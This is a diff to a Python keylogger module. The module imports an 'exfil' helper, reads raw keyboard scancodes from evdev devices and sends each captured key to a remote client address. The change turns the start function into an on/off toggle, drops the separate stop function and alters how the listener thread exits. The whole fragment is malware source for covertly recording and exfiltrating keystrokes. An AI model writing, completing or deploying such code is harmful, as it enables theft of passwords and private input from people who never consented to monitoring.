@@ -19,6 +19,7 @@ import exfil
 client = ""
 string = ""
 protocol = ""
+logger = False
 
 scancodes = {
     # Scancode: ASCIICode
@@ -105,14 +106,13 @@ def startKeylogger(address, proto):
 	client = address
 	protocol = proto
 
-	logThread = threading.Thread(target=startKeylistener)
-	logThread.daemon = True
-	logThread.start()
-	logger = True
-
-def stopKeylogger():
-	global logger
-	logger = False
+	if not logger:
+		logThread = threading.Thread(target=startKeylistener)
+		logThread.daemon = True
+		logThread.start()
+		logger = True
+	else:
+		logger = False
 
 def findKeyboard():
 	devices = [InputDevice(fn) for fn in list_devices()]
@@ -131,4 +131,4 @@ def startKeylistener():
 					key_lookup = scancodes.get(temp.scancode)
 					sendMessage(format(key_lookup))
 		else:
-			break
+			thread.exit()
